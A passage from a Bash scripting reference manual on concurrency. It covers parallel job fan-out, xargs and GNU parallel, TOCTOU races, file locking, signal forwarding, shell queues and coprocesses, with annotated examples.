`${arr[@]/x/}` rewrites each element's string content; if an element
*equals* `done_pid`, it becomes the empty string but stays in the
array. The slot count never drops, the `while` loop spins, and after
the next `wait -n` the same `done_pid` is "removed" again with no
effect. The index-based `unset` is the only correct form.

### Pre-5.1 fallback

Without `wait -n -p`, the script must poll. The simplest fallback
uses `wait -n` (4.3+) and a per-iteration scan:

```bash
# scenario: 4.3+ form, no -p — scan jobs to find the dead one
declare -i max=4
declare -a pids=()

for task in "${tasks[@]}"; do
  while (( ${#pids[@]} >= max )); do
    wait -n         # blocks until any child exits
    for i in "${!pids[@]}"; do
      kill -0 "${pids[i]}" 2>/dev/null || unset 'pids[i]'
    done
  done
  do_task "$task" &
  pids+=( $! )
done
wait
```

`kill -0 PID` returns 0 if the PID exists (in any state) and non-zero
if it has been reaped. Iterating after `wait -n` finds and removes
exactly the dead entry. Less efficient than the 5.1+ form (one extra
syscall per tracked PID per cycle) but correct.

### External alternative: GNU `parallel`

```bash
parallel -j 4 do_task ::: "${tasks[@]}"
```

External dependency but battle-tested — see §16.8. Prefer for
production work where the bash version of the consumers is uncertain.

### See also

- §16.2 — `wait` and `wait -n` reference
- §16.7 — `xargs -P` for the simpler one-input/one-job case
- §16.8 — GNU parallel
- BCS1102 (parallel execution), BCS1103 (wait patterns)

## 16.6 The job table under concurrency

When job control is on, every backgrounded process becomes a *job*
with a small-integer ID. Job control is on by default for interactive
shells and *off* by default for scripts (BCS1101).

### Default state

- Non-interactive bash (the script case): job control off, `jobs`
  prints nothing useful.
- Interactive bash: job control on, `jobs` lists running and stopped
  jobs.
- Override in a script: `set -m` enables job control inside a
  non-interactive shell (rarely needed).

### `jobs` output

When job control is on, the builtin shows the live job table:

```bash
# scenario: interactive shell, three backgrounded jobs
$ sleep 30 &
[1] 12345
$ sleep 60 &
[2] 12346
$ sleep 90 &
[3] 12347
$ jobs
[1]   Running                 sleep 30 &
[2]-  Running                 sleep 60 &
[3]+  Running                 sleep 90 &
```

| Column | Meaning |
|--------|---------|
| `[N]` | job ID, used in `%N` shorthand for `kill`, `fg`, `wait` |
| `+`/`-` | `+` is "current job" (foreground if `fg` is run), `-` is "previous" |
| state | `Running`, `Stopped`, `Done`, `Exit N` |
| command | the original command line |

### `disown` semantics

`disown` removes a job from the table without killing it. After
disown, the script no longer SIGHUPs the child on exit and `jobs`
no longer reports it:

```bash
# scenario: spawn a daemon, hand it off to init
nohup my_daemon >/var/log/daemon.log 2>&1 &
disown -h $!     # immune to SIGHUP from this shell
disown $!        # remove from job table entirely
```

`disown -h JOB` keeps the entry in the table but marks it
SIGHUP-immune. `disown JOB` removes it altogether. `disown -a`
disowns every job; `disown -r` only the running ones.

### Pipelines as units

Each pipeline is a single job, regardless of how many processes it
contains:

```bash
$ producer | filter | consumer &
[1] 12345     # one job, three processes
$ jobs
[1]+  Running                 producer | filter | consumer &
```

`kill %1` signals the *foreground* process of the pipeline; `kill -- -%1`
(note the `--` and the negative job id) signals the whole process
group, killing all three.

### Strict-mode caveat

A backgrounded command that fails does *not* trip `set -e` in the
parent — the parent only sees the failure when it `wait`s for that
PID. `wait` itself is the failure-checkpoint; a script that spawns
without waiting will silently lose error visibility (BCS0601).

### See also

- §16.1 — sequential vs background
- §16.11 — signal handling under concurrency (kill 0, pgid)
- BCS1101 (background job management)

## 16.7 `xargs -P`

External tool for parallel one-shot work — when each unit of input
maps to one independent invocation of a command (BCS1102). Simpler
than a hand-rolled fan-out (§16.5) for the common case.

### Form register

- `xargs -P N -I {} cmd {}` — run up to N invocations in parallel,
  one input per invocation.
- `-n N` — pack N inputs per invocation (default 1 with `-I`).
- `-0` — NUL-separated input; pairs with `find -print0`.
- `-r` — do not run if input is empty (GNU extension; BSD lacks).
- Exit status: 123 if any invocation exited 1–125; 124 if any was
  killed by signal; 125 if `xargs` itself failed.

### `find -print0` piped example

The canonical NUL-safe variant:

```bash
# scenario: convert every PNG under . to JPEG, 4-way parallel
find . -type f -name '*.png' -print0 \
  | xargs -0 -P 4 -I {} sh -c 'magick convert "$1" "${1%.png}.jpg"' _ {}
```

- `-print0` emits NUL-terminated paths (newlines and spaces in
  filenames preserved).
- `-0` tells xargs to expect NUL framing.
- `-P 4` runs four converters concurrently.
- `-I {}` substitutes the input where the placeholder appears.
- `sh -c '...' _ {}` is the BCS-recommended way to run a small shell
  expression — `_` becomes `$0`, `{}` becomes `$1`. Avoids quoting
  surprises if the path contains `$`, backticks, or quotes.

### Line-buffering pitfall

When parallel invocations write to the same stdout, output interleaves
at write boundaries. Lines longer than `PIPE_BUF` (typically 4096
bytes; §14.12) split across writes and tear:

```bash
# scenario: parallel commands writing to one stdout — interleaved output
seq 1 100 | xargs -P 8 -I {} sh -c 'echo "long line {} ============================="'
# output frequently shows two lines mashed together
```

Workarounds:

- `xargs -P 4 -L 1 ... | grep -F .` — the `-L 1` mode does not help
  this; the issue is downstream, not in xargs.
- `stdbuf -oL cmd` — line-buffer the *child's* stdout. With glibc-
  linked binaries this prevents partial writes within a line.
- Per-PID redirection: `cmd > "/tmp/out.$$"` from inside the command;
  concatenate after the parallel block.
- `parallel --line-buffer` (§16.8) — GNU parallel handles this case
  natively.

### Exit-status aggregation

`xargs -P` sets a non-zero exit if *any* child failed, but does not
report which one. For per-task reporting, log inside the command:

```bash
# scenario: capture per-task failures into a log
find . -type f -name '*.png' -print0 \
  | xargs -0 -P 4 -I {} sh -c 'process "$1" || echo "FAIL $1" >> /tmp/fail.log' _ {}
```

### See also

- §16.5 — hand-rolled bounded fan-out for richer error handling
- §16.8 — GNU parallel for line-buffer and joblog support
- §14.12 — `PIPE_BUF` and atomic-append details
- BCS1102 (parallel execution)

## 16.8 GNU parallel

Richer parallel-execution tool than `xargs -P` (§16.7). Heavyweight
external dependency; in return, line-buffered output, per-job logs,
resumable runs, and remote execution (BCS1102).

### Form register

- `parallel cmd ::: arg1 arg2 …` — explicit args after the `:::`
  separator.
- `parallel cmd :::: file` — args from `file` (one per line).
- `parallel cmd ::: a b ::: 1 2` — Cartesian product (`a 1`, `a 2`,
  `b 1`, `b 2`).
- `parallel -j N` — concurrency cap (default: number of CPU cores).
- `parallel --joblog FILE` — append per-job records to FILE.
- `parallel --resume --joblog FILE` — pick up where a previous run
  with the same joblog stopped.
- `parallel --line-buffer` — never split output mid-line.

### `:::` separator example

```bash
# scenario: process every file in two directories, three workers
parallel -j 3 'gzip -k {}' ::: data/*.csv archive/*.csv

# scenario: build a Cartesian product — every host crossed with every action
parallel -j 8 'ssh {1} sudo {2}' ::: ok1 ok2 ok3 ::: 'apt update' 'systemctl status nginx'
```

- `:::` introduces a fixed argument list inline; `::::` reads from a
  file. Multiple `:::` introduce additional dimensions to the
  Cartesian product.
- `{1}`, `{2}`, … reference the Nth input source. `{}` is shorthand
  for `{1}`.
- `{.}` strips the extension; `{/}` keeps only basename; `{//}` only
  dirname.

### Joblog and resume

```bash
# scenario: long-running batch, resume on interruption
parallel --joblog /tmp/build.joblog -j 4 'build_one {}' ::: target_*

# if interrupted (Ctrl-C, kill, system crash):
parallel --resume --joblog /tmp/build.joblog -j 4 'build_one {}' ::: target_*
# only the unfinished targets re-run
```

### Citation

GNU parallel asks scripts that use it to cite the tool in publications:

```text
O. Tange (2018): GNU Parallel 2018, March 2018, https://doi.org/10.5281/zenodo.1146014
```

For long-running production scripts, suppress the citation banner
once with `parallel --citation` (interactive); the banner does not
appear in non-TTY runs by default. See `man parallel` for the full
discussion.

### When to choose `parallel` over `xargs -P`

- Need line-buffered output (`--line-buffer`) — common when piping
  multiple workers' stdout to one log.
- Need resumability (`--joblog --resume`) — important for hour-scale
  batches.
- Need remote execution (`-S host1,host2`) — parallel can SSH out.
- Need a Cartesian product without writing a nested loop.

For the simple "one input → one command" case, `xargs -P` is lighter
and almost always installed.

### See also

- §16.7 — `xargs -P` for the simple case
- §16.5 — hand-rolled fan-out without external deps
- BCS1102 (parallel execution)

## 16.9 Race conditions in shell

A race condition arises when correctness depends on the *order* of
operations that are not atomic from the shell's point of view. Shell
scripts are unusually prone to these bugs because most filesystem
checks (`-f`, `-e`, `-d`) and most "if absent then create" idioms split
into a *test* and an *act* with a window between them where another
process — friendly or hostile — can change the answer. This is the
TOCTOU (time-of-check / time-of-use) class.

The classic illustration:

```text
   process A                process B
   ----------------          ----------------
   [[ -f $f ]]              # A: test passes
                             rm -f -- "$f"  # B: removes file
   rm -- "$f"               # A: now fails or removes wrong file
                             > "$f"         # B: re-created (different inode)
```

Between A's check and A's act, B has changed the world. No amount of
defensive testing closes this gap — only an *atomic* operation does.

### TOCTOU on a regular file

```bash
# wrong — test then act, racy
if [[ -f $TARGET ]]; then
  rm -- "$TARGET"
fi

# right — let the kernel atomically test-and-act
rm -f -- "$TARGET"        # ENOENT is silently ignored
# ⇒ no window: rm(2) checks existence under the inode lock
```

For the create-only case (must not clobber an existing file), the
atomic primitive is `O_EXCL` via `set -C` (noclobber):

```bash
# right — atomic exclusive create
set -C
: > "$LOCK" 2>/dev/null || die 'already locked'
set +C
# ⇒ open(2) with O_CREAT|O_EXCL fails atomically if the file exists
```

### Symlink races (TOCTOU on the path)

A path traversal that follows a symlink at use-time can be retargeted
between check and use, letting an attacker substitute the file the
victim writes. `chmod`, `chown`, and `cat >` are all vulnerable when
the path lies in an attacker-writable directory.

```bash
# wrong — symlink can be swapped between -d test and write
[[ -d $userdir ]] && cp secret "$userdir"/copy

# right — operate on a fd opened with no-follow semantics
exec {fd}<"$userdir" || die 'cannot open'
[[ -d /proc/self/fd/$fd ]] || die 'not a directory'
cp secret "/proc/self/fd/$fd"/copy
exec {fd}<&-
# ⇒ the fd binds the inode; cannot be retargeted by a later symlink swap
```

Where `/proc/self/fd` is unavailable, place the work inside a directory
the script *creates* with `mktemp -d` (mode 0700, owned by the running
user) — see §20.13.

### Tempfile races

```bash
# wrong — predictable name, racy create
tmp="/tmp/work.$$"; > "$tmp"

# right — mktemp(1) creates atomically with mode 0600
tmp=$(mktemp) || { echo 'mktemp failed' >&2; exit 5; }
trap 'rm -f -- "$tmp"' EXIT
echo "tmp prefix:"               # ⇒ tmp prefix:
printf '%s\n' "${tmp%%[A-Za-z0-9]*}"   # → "/tmp/" before the random suffix
# (mktemp uses O_EXCL internally and a 0600 umask)
```

Note: some embedded systems ship a `tempfile(1)` helper that does *not*
use `O_EXCL`. Treat `mktemp(1)` as the only portable safe primitive.

### Lock-then-do races

A "test for lockfile then create" pair is itself a TOCTOU. Use either
`flock` on a long-lived fd (§16.10) or atomic `O_EXCL` create. The
PID-bearing lockfile must check `kill -0 "$old_pid"` *after* taking the
lock, never before, otherwise a stale-PID detection becomes its own
race.

### Signal-during-handler

Signals delivered while a trap is running are queued, not lost, but the
handler is not re-entered. State a trap touches must be reset to a
consistent value *before* the trap can fire again — typically by doing
the cleanup last, or guarding with a single-shot flag (§12, §16.11).

### Fixes that always work

| Pattern | Atomic primitive |
|---------|------------------|
| Create-or-fail | `set -C; : > "$f"` (uses `O_EXCL`) |
| Lock-or-fail | `flock -n` on an fd (§16.10) |
| Tempfile | `mktemp` / `mktemp -d` |
| Rename-into-place | `mv -- "$tmp" "$final"` (rename(2) is atomic) |
| Append | `>> "$f"` is atomic for writes ≤ `PIPE_BUF` |

The "rename into place" idiom deserves its own example because it
solves a *different* race — the half-written-file race, where a reader
opens the target while a writer is still writing. Always write to a
sibling tempfile and `mv` it on top:

```bash
# scenario: produce a config file readers must never see partial
tmp=$(mktemp -- "$target.XXXXXX")
trap 'rm -f -- "$tmp"' EXIT
generate_config > "$tmp"
mv -- "$tmp" "$target"
trap - EXIT
# ⇒ readers see either the old contents or the new — never a mixture
```

`mv` within the same filesystem is `rename(2)`, which is atomic from
the kernel's perspective: the directory entry switches inodes in a
single operation. Across filesystems `mv` falls back to copy + unlink,
which is *not* atomic — keep the tempfile in the same directory as
its target, never in `/tmp`.

**See also**: §16.10 (locking primitives), §16.11 (signal handling),
§20.13 (symlink/path security), §12 (traps).

## 16.10 Locking primitives

When two scripts must not run a critical section at the same time, the
shell needs a real mutex — not a "is there a lockfile?" check, which is
itself racy (§16.9). Three idioms cover almost every case: `flock` on a
file descriptor, `mkdir` as an atomic mutex, and `O_EXCL` create via
`noclobber`. Each has a different recovery story for stale locks left
behind by a crash.

### `flock` on a long-lived fd

`flock(1)` takes an advisory `fcntl` lock on an open file descriptor.
The kernel releases the lock automatically when the fd closes —
including when the process dies — so stale-lock cleanup is free. The
canonical idiom wraps the critical section in a subshell that holds
the fd for its entire lifetime:

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

declare -r LOCK=/var/lock/myjob.lock

# scenario: only one instance of the critical section may run at a time
(
  flock -x -w 30 200 || { echo 'lock timeout' >&2; exit 1; }
  # critical section — fd 200 holds the exclusive lock here
  do_work
) 200>"$LOCK"
# ⇒ subshell exits → fd 200 closes → kernel releases lock
```

For non-blocking attempts, use `flock -n`. For self-locking (a script
re-execing itself under the lock):

```bash
# scenario: re-exec under a lock with no subshell
[[ ${FLOCKER:-} != "$0" ]] && exec env FLOCKER="$0" flock -en "$0" "$0" "$@"
# critical section follows in the re-exec'd process
```

### `mkdir` as an atomic mutex

`mkdir(2)` is atomic: either the directory is created or `EEXIST` is
returned. This works on every Unix, including filesystems where
`flock` semantics differ (NFS, CIFS). Cleanup is the caller's problem,
so a trap is mandatory (BCS0110, BCS0603):

```bash
declare -r LOCKDIR=/var/lock/myjob.d

acquire_lock() {
  local -i tries=0
  until mkdir -- "$LOCKDIR" 2>/dev/null; do
    ((tries+=1 < 30)) || return 1
    sleep 1
  done
  trap 'rmdir -- "$LOCKDIR"' EXIT INT TERM
}

acquire_lock || die 1 'could not acquire lock'
do_work
# ⇒ EXIT trap removes the directory; INT/TERM trigger it on signal
```

A crash *before* the trap is installed leaves a stale lockdir. Mitigate
by writing `$BASHPID` into a file inside the lockdir and validating
with `kill -0` — but only *after* `mkdir` succeeded, never before.

### `noclobber` (`O_EXCL`) create

The shell's redirection layer can do an `O_EXCL` create directly via
`set -C`. The result is a file whose existence is the lock; whose
content can be the holder's PID for diagnostics:

```bash
declare -r LOCKFILE=/var/lock/myjob.pid

acquire_lock() {
  set -C
  if ! printf '%d\n' "$$" > "$LOCKFILE" 2>/dev/null; then
    set +C
    # check for stale lock: holder dead?
    local -i pid; pid=$(<"$LOCKFILE") || return 1
    if ! kill -0 "$pid" 2>/dev/null; then
      rm -f -- "$LOCKFILE"
      acquire_lock; return $?
    fi
    return 1
  fi
  set +C
  trap 'rm -f -- "$LOCKFILE"' EXIT
}
```

This idiom has a real-world wrinkle: a holder that dies between
`set -C; printf ... > "$LOCKFILE"` and `trap '...' EXIT` leaks the
lockfile. The `kill -0` recovery path handles it, at the cost of one
window where two scripts could both decide the lock is stale. For
single-host single-user scripts this is acceptable; for fleet-wide
locking, prefer `flock`.

### Choosing

| Primitive | Best for | Crash recovery | Cross-host |
|-----------|----------|----------------|------------|
| `flock` fd | local single-host critical sections | automatic (kernel) | no (advisory only) |
| `mkdir` | NFS / portable scripts | manual via trap | yes (atomic on most NFS) |
| `noclobber` | minimal dependencies | manual + PID check | partial |

Lock the *resource itself* where possible (`flock` on the data file's
fd), not a separate lockfile — this prevents the case where the lock
disappears while the data still exists.

### Common pitfalls

- **Locking on `/tmp`** — `/tmp` is often `tmpfs` and clears on reboot,
  which is fine, but it is also world-writable. Use a directory only
  the script's user can write (`/var/lock/`, `${XDG_RUNTIME_DIR}/`)
  to avoid hostile pre-creation of the lock path.
- **`flock` and pipes** — `flock` only locks the *file descriptor it
  was given*. A pipeline like `flock -x lockfile | grep ...` runs
  `flock` in a subshell whose fd vanishes immediately. Use the
  subshell-redirect form `( flock -x 200; ... ) 200>"$LOCK"` shown
  above, or `flock -c 'cmd'`.
- **Forgetting `-x` / `-s`** — `flock` defaults to exclusive (`-x`),
  but explicit is better. Use `-s` for a shared (reader) lock when
  multiple readers can run concurrently.
- **NFS surprises** — older NFS clients do not honour `flock` (they
  silently no-op). On NFSv4 it works; on NFSv3 prefer `mkdir`. Test
  on the target filesystem before shipping.
- **Holding the lock too long** — a critical section that takes
  minutes blocks every contender for the same time. Where possible,
  do the slow work *outside* the lock and only swap the result in
  under the lock (read-copy-update style):

  ```bash
  result=$(slow_compute "$@")        # outside the lock
  ( flock -x 200
    install -m 0644 /dev/stdin "$STATE" <<<"$result"
  ) 200>"$LOCK"
  # ⇒ lock is held only for the install, not the compute
  ```

**See also**: §16.9 (race conditions), §16.11 (signals during locks),
§20.10 (`mktemp` and tempfile security), §12 (traps), `flock(1)`.

## 16.11 Signal handling under concurrency

A script with background children is a small process group. When the
user presses Ctrl-C, the terminal sends `SIGINT` to the *foreground
process group* — but only the parent is in that group; backgrounded
workers are not, and they keep running, orphaned, until they finish or
the kernel reaps them via the parent's death. To clean up properly the
parent must catch the signal and forward it to its children
explicitly. This is the trap-and-forward pattern, and every fan-out
script needs it (BCS0110, BCS0603).

### Trap-and-forward template

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

declare -a pids=()

cleanup() {
  local -i rc=$?
  # forward TERM to every child still alive; ignore "no such process"
  if (( ${#pids[@]} )); then
    kill -TERM "${pids[@]}" 2>/dev/null || true
    wait "${pids[@]}" 2>/dev/null || true
  fi
  exit "$rc"
}
trap cleanup EXIT
trap 'cleanup' INT TERM HUP

# scenario: dispatch workers, register PIDs before any await
for host in host1 host2 host3; do
  worker "$host" &
  pids+=("$!")
done

# wait for all; if a signal arrives during wait, cleanup runs
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
# ⇒ Ctrl-C kills children before parent exits; no orphans
```

Three points are load-bearing:

1. **Register the PID immediately after `&`.** A signal that arrives
   between `worker &` and `pids+=("$!")` will not see the new child.
   Keep the two lines adjacent and never compute anything between them.
2. **`wait` is interruptible.** When `INT` arrives, `wait` returns 128+N
   and the trap runs; `set -e` would otherwise abort. The `|| true`
   suppresses the non-zero status from a killed child.
3. **EXIT is the canonical cleanup hook.** It fires on normal exit,
   `set -e` exit, and trap-driven exit alike, so the same `cleanup`
   function covers every path. Adding traps for `INT TERM HUP` simply
   converts those signals into an `exit`.

### Whole-process-group kill (`kill 0`)

If the parent and all its children share a process group, `kill 0`
signals the entire group in one call:

```bash
# scenario: process-group fan-out under set -m (job control)
set -m                    # each backgrounded pipeline gets its own pgid
                          # in interactive shells; non-interactive needs
                          # explicit setsid
trap 'kill -- -$$ 2>/dev/null; exit 130' INT TERM
# kill -- -PID  →  kill the process group whose pgid == PID
# at the parent, $$ is its own pgid only if it leads the group
```

`kill 0` (no PID) sends to the *caller's* process group, which
includes the script and all children that have not detached. This is
the simplest variant and is preferred where job control is not in
play:

```bash
trap 'trap - INT; kill 0' INT
# ⇒ on Ctrl-C: clear the trap (avoid recursion), signal the whole group
# the parent then takes the same signal and exits
```

### Pitfalls

- **Children must trap independently.** A trap installed in the parent
  is *not* inherited by `exec`'d processes (only by subshells). If a
  worker is `exec foo`, the parent's `trap` is gone. Wrap the worker:
  `( trap '...' TERM; exec foo )`.
- **`SIGKILL` cannot be trapped.** If the parent dies on `KILL`, no
  cleanup runs; orphan children become init's responsibility. For
  systemd services use `KillMode=mixed` so the unit kills the whole
  cgroup.
- **Re-entry is queued, not parallel.** A second `INT` while the trap
  is running is held until the handler returns; do the destructive
  work first and the user-facing output last so a second Ctrl-C still
  produces a clean exit.
- **`wait` returns 128+N on signal.** When a child dies on a signal,
  `wait` returns `128 + signum` (e.g. 130 for `SIGINT`). Treat this
  as a normal child status (§16.4); do not special-case it unless the
  caller cares about the difference between "child failed" and "child
  was killed".

### Process-group ownership

In a non-interactive script, all children of the parent share the
parent's process group by default. Job control (`set -m`) is *off* in
non-interactive shells unless explicitly enabled. To start a child in
its own process group — useful when the child must survive the
parent's signal — use `setsid`:

```bash
# scenario: detach a long-running worker into its own process group
setsid -f --wait worker "$@" &
detached_pid=$!
# ⇒ worker runs with a fresh pgid; kill 0 in the parent does not reach it
```

Conversely, `kill -TERM -- -"$detached_pgid"` signals the *whole* group
of the detached child, including any grandchildren it spawned — useful
for hierarchies the parent must clean up but does not directly own.

**See also**: §16.10 (locking — signals during a lock), §11 (process
management, pgid mechanics), §12 (traps in detail), BCS0110, BCS0603.

## 16.12 Queue patterns

Producer-consumer in shell. Three primitives are practical: an
append-only file with locking, a named pipe (FIFO), and a shell
process-substitution. Anything more sophisticated — persistent
queues, crash recovery, retries — belongs in a real broker (Redis,
RabbitMQ, NATS).

### File-as-queue with `flock`

The simplest persistent queue: producer appends, consumer locks-and-
reads-and-truncates atomically:

```bash
# scenario: producer appends a job; multiple producers safe via O_APPEND
queue_push() {
  local -- payload=$1
  printf '%s\n' "$payload" >> /var/spool/myapp/queue
}

# scenario: consumer drains one batch under exclusive lock
queue_drain() {
  local -- queue=/var/spool/myapp/queue
  local -- tmp
  tmp=$(mktemp)
  (
    flock -x 200
    [[ -s $queue ]] || return 1
    cp -- "$queue" "$tmp"
    : > "$queue"
  ) 200>"$queue.lock"
  while IFS= read -r job; do
    process_job "$job"
  done < "$tmp"
  rm -- "$tmp"
}
```

Producers rely on `O_APPEND` atomicity for short writes (§14.12) and
need no lock. Consumers must lock — between "read the file" and
"truncate the file" any other consumer would see duplicate work or a
producer would lose appends.

### FIFO producer-consumer

For in-process or sibling-process coordination, a named pipe streams
jobs without persistence:

```bash
# scenario: one producer, three consumers, no on-disk queue
declare -- fifo
fifo=$(mktemp -u)
mkfifo -- "$fifo"
trap 'rm -f -- "$fifo"' EXIT

# producer in the background
(
  for i in {1..100}; do
    printf 'task-%03d\n' "$i"
  done
) > "$fifo" &
prod_pid=$!

# three consumers, each reading the same FIFO
for c in 1 2 3; do
  (
    while IFS= read -r task; do
      printf 'consumer %d processing %s\n' "$c" "$task" >&2
    done < "$fifo"
  ) &
done

wait "$prod_pid"
# producer closed FIFO; consumers see EOF and exit
wait
```

- Multiple consumers from one FIFO is supported but ordering is
  non-deterministic — exactly one consumer receives each line, but
  which one depends on scheduling.
- Producer EOF (closing the writing fd) propagates to all consumers
  as `read` returning non-zero — the loop ends naturally.
- The trap ensures the FIFO is removed even on early exit (§17.4).

### Process-substitution queue

For one-shot fan-in (consumer reads once, producer streams once),
process substitution avoids the FIFO file entirely:

```bash
# scenario: consume the lines of one producer with no on-disk artefact
while IFS= read -r line; do
  process "$line"
done < <(producer_command)
```

The `< <(...)` form sets up an anonymous pipe; the producer runs in
parallel, the consumer reads at its own pace. No queue length, no
persistence — but no FIFO management either.

### When bash is the wrong answer

- Persistent queue with crash recovery — bash has no transaction
  primitive.
- Multi-host distribution — use a real broker.
- Fairness/priority scheduling — bash's "whoever reads first wins" is
  fine for small N; degrades under contention.
- Replay or dead-letter queues — outside bash's scope.

### See also

- §14.12 — `PIPE_BUF` and atomic-append details
- §16.10 — locking primitives
- §17.4 — named pipes (FIFOs) reference
- BCS1006 (temporary file handling), BCS1101 (background job management)

# Part XVII — Coprocesses and IPC

*Inter-process communication primitives available to bash scripts: coprocesses, FIFOs, anonymous pipes, network sockets via `/dev/tcp`, and shared memory via `/dev/shm`.*

---

---

## 17.1 The `coproc` builtin

`coproc` starts a process with a bidirectional pipe pair connected to
the parent shell. Bash 4.0+; Bash 5.x lifted the "one coproc per shell"
restriction.

### Syntax

- `coproc NAME { commands; }` — named coproc, multi-command body.
- `coproc NAME command [args]` — named coproc, single-command body.
- `coproc { commands; }` — unnamed; default array name `COPROC`,
  default PID variable `COPROC_PID`.
- `coproc command` — the single-command, single-word case is special:
  the array is named after the command word *only* when the command
  word is a simple unquoted identifier; otherwise it is `COPROC`.

### What gets defined

For `coproc NAME ...`, bash creates:

| Name | Holds |
|------|-------|
| `${NAME[0]}` | the *read* fd — read from coproc's stdout |
| `${NAME[1]}` | the *write* fd — write to coproc's stdin |
| `${NAME_PID}` | the coproc's PID (note: literal `NAME_PID`, not `${NAME}_PID`) |

The PID variable is named by concatenating the chosen name with the
literal suffix `_PID`. For `coproc CALC ...` the variable is `CALC_PID`;
for the unnamed form the variable is `COPROC_PID`. The variable is
unset when the coproc terminates.

### Minimal invocation

```bash
# scenario: launch bc as a long-lived calculator
coproc CALC { bc -l; }

# write a query, read the answer
printf '3.14 * 2\n' >&"${CALC[1]}"
read -r answer <&"${CALC[0]}"
printf 'answer: %s\n' "$answer"
# ⇒ answer: 6.28

# clean shutdown
exec {CALC[1]}>&-          # close the write fd; bc sees EOF
wait "$CALC_PID"
```

The fd dereferences `>&"${CALC[1]}"` and `<&"${CALC[0]}"` are syntax-
heavy but mechanical: substitute the array element, prefix with `>&`
(write) or `<&` (read). Closing the write fd causes the child to see
EOF and exit; `wait` reaps it.

### Restrictions

- Bash 4.x: only one coproc may be live at a time. A second `coproc`
  call before the first exits is a fatal error.
- Bash 5.x: multiple coprocs allowed (§17.3).
- Coprocs cannot be nested inside `(...)` subshells; the fds would
  not propagate to the parent's environment.

### Why use `coproc` over `command | other`

A pipeline `producer | consumer` runs both halves in parallel but
neither can talk *back* to the other. `coproc` is the answer when the
parent script needs to drive a long-lived child interactively —
sending one query and reading one answer at a time, repeatedly,
without forking the child anew per query.

### See also

- §17.2 — bidirectional fd pairs (the canonical persistent-worker
  pattern)
- §17.3 — multiple coprocesses (Bash 5.x)
- BCS1101 (background job management)

## 17.2 Bidirectional fd pairs

The pattern of using a coproc as a persistent worker. The parent
sends queries on the write fd and reads answers on the read fd; the
child stays alive, amortising start-up cost across many calls.

### Canonical form

```bash
# scenario: keep bc resident, feed it expressions
coproc BC { bc -l; }

eval_expr() {
  local -- expr=$1 result
  printf '%s\n' "$expr" >&"${BC[1]}"
  IFS= read -r -t 1 result <&"${BC[0]}"
  printf '%s\n' "$result"
}

eval_expr '3.14 * 2'      # ⇒ 6.28
eval_expr '2 ^ 32'        # ⇒ 4294967296
eval_expr 'sqrt(2)'       # ⇒ 1.41421356237309504880

exec {BC[1]}>&-           # close write fd → child sees EOF
wait "$BC_PID"
```

- `>&"${BC[1]}"` writes to the child's stdin.
- `<&"${BC[0]}"` reads from the child's stdout.
- `read -r -t 1` adds a one-second guard against a child that hangs
  (see deadlock discussion below).
- The persistent process saves ~1 ms per call versus `result=$(echo "$expr" | bc)`.
- `bc -l` autoflushes after each line; `awk` would not. See alternative
  callout below.

### Deadlock-on-buffering — the canonical pitfall

Most line-buffered tools (`bc`, `dc`, `python -i`) flush on each
newline. *Block-buffered* tools — most C programs when stdout is a
pipe — buffer up to 4 KB before writing. The parent then `read`s
forever waiting for output that the child has produced but not
flushed:

```bash
# wrong — awk block-buffers when its stdout is a pipe
coproc AWK { awk '{ print toupper($0) }'; }
printf 'hello\n' >&"${AWK[1]}"
read -r reply <&"${AWK[0]}"        # hangs — awk's output sits in the buffer
```

The fix is `stdbuf -oL` (or `stdbuf -o0` for unbuffered), which
overrides the buffering mode at exec time:

```bash
# right — force line buffering on awk's stdout
coproc AWK { stdbuf -oL awk '{ print toupper($0) }'; }
printf 'hello\n' >&"${AWK[1]}"
read -r reply <&"${AWK[0]}"
printf '%s\n' "$reply"             # ⇒ HELLO
```

`stdbuf` works for any C program that uses stdio and respects
`LD_PRELOAD`. It does *not* work for programs that bypass stdio (Go,
some Rust binaries) or programs that explicitly set their buffer mode
(`setvbuf`). In those cases the child must be patched to flush
explicitly, or replaced.

### Choosing the worker

- `bc -l` — arbitrary-precision arithmetic, autoflushes, ubiquitous.
  Used in this chapter for illustration.
- `awk -v ...` — text transformation; needs `stdbuf -oL`.
- `python3 -u` — `-u` is Python's "unbuffered" flag.
- `jq --unbuffered` — explicit JSON-line streaming mode.

If `bc` is unavailable, the `awk` form above is the portable
fallback, with `stdbuf -oL` mandatory.

### Read-fd hygiene

- Always pair the read with `-t TIMEOUT` so a stuck child surfaces as
  an error rather than a hang (§14.2).
- Always close the write fd with `exec {fd}>&-` before `wait` —
  otherwise the child waits for EOF that never comes.

### See also

- §17.1 — `coproc` invocation reference
- §17.3 — multiple coprocesses (Bash 5.x)
- §14.2 — `read -t` timeout patterns
- BCS1101 (background job management), BCS1104 (timeout handling)

## 17.3 Multiple coprocesses

Bash 4.0 supported only one anonymous `coproc` at a time. Bash 4.4+ allows multiple **named** coprocesses to run concurrently — each must be given a name so its array variables and PID do not collide.

### Naming and fd dereference

Each named coproc creates a two-element array `NAME` whose elements `${NAME[0]}` and `${NAME[1]}` are the read- and write-end file descriptors, plus a scalar `NAME_PID` carrying the child's PID. To `read` from coproc `A` you must dereference its specific array — there is no implicit "current" coproc.

```bash
# scenario: route a query through one of two coprocs based on input
coproc A { while read -r n; do printf '%s\n' "$((n*2))"; done; }
coproc B { while read -r n; do printf '%s\n' "$((n*n))"; done; }

double() { printf '%s\n' "$1" >&"${A[1]}"; read -r ans -u "${A[0]}"; echo "$ans"; }
square() { printf '%s\n' "$1" >&"${B[1]}"; read -r ans -u "${B[0]}"; echo "$ans"; }

double 7        # ⇒ 14
square 7        # ⇒ 49

# tear down — close write ends so child loops exit, then wait
exec {A[1]}>&- {B[1]}>&-
wait "$A_PID" "$B_PID"
```

The non-obvious bits are the syntax `>&"${A[1]}"` (write to coproc A's stdin) and `read -u "${A[0]}"` (read from its stdout). Forgetting the array index and writing `>&"$A"` silently fails: `$A` expands to the array's first element by default but the redirection parses ambiguously.

### fd close discipline

Coprocs do not exit until their write end (from the parent's perspective) is closed and their input loop hits EOF. Leaving fds open across an `exec` is a classic leak: a long-running child started later in the script will inherit the coproc fds and prevent the producer from ever seeing EOF.

```bash
# scenario: explicit close before launching unrelated children
coproc WORKER { while read -r line; do process "$line"; done; }

printf '%s\n' job1 job2 job3 >&"${WORKER[1]}"
exec {WORKER[1]}>&-              # close write end → worker sees EOF
wait "$WORKER_PID"               # reap

